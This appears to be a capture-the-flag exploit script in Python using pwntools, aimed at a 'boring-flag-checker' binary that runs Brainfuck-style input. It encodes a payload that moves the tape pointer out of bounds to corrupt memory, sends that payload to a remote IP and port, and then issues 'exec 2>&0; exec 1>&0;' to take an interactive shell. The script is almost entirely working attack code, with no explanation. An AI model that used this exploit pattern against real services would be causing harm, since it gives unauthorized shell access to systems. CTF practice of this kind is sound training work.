from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './boring-flag-checker'
HOST = '193.57.159.27'
PORT = 39108

# HOST = '172.17.0.2'
# PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process([TARGET, './pwn-out'])
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		r = remote(HOST, PORT)
		with open('pwn-out', 'rb') as f: 
		# with open('rev/prog.bin', 'rb') as f: 
			r.sendlineafter(': ', f.read().decode('latin-1'))
		return r

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def bf2byte(inp):
	bf = ['>', ']', '<', '[', ',', '.', '-', '+']
	out = ''
	for i in inp:
        	out += chr(0x20+bf.index(i))
	return out

payload = ''
payload += '+' * 0x41
payload += '.'
payload += '>' * 0x138
# payload += '-' * (0x35-3-3)
payload += '-' * (0x35 - 3)
payload += '>'
payload += '-' * 0x4
payload += '>'
payload += '+' * 0xc
payload += '>>>>>>>>,'
payload = bf2byte(payload)

with open('pwn-out', 'wb') as f:
	f.write(payload)
r = start()
if args.D:
	debug(r, [0x16ad])

r.recvuntil('A')
sleep(0.2)
r.send('exec 2>&0; exec 1>&0;\n')

r.interactive()
r.close()
